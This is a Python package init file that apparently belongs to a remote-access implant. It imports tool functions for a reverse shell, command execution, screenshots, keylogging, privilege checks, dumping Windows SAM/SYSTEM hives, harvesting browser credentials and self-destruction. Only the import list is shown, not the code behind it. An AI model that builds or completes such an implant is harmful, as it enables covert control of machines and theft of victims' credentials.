"""
Tools module - Each tool is in its own file
"""

from .shell import reverse_shell
from .cmd import execute_command
from .screenshot import take_screenshot
from .keylogger import keylogger_action
from .privesc import check_privileges
from .creds import get_sam_system_hives
from .destroy import destroy_agent
from .creds_navigator import get_creds_navigator

__all__ = [
    'reverse_shell',
    'execute_command',
    'take_screenshot',
    'keylogger_action',
    'check_privileges',
    'get_sam_system_hives',
    'destroy_agent',
    'get_creds_navigator',
]
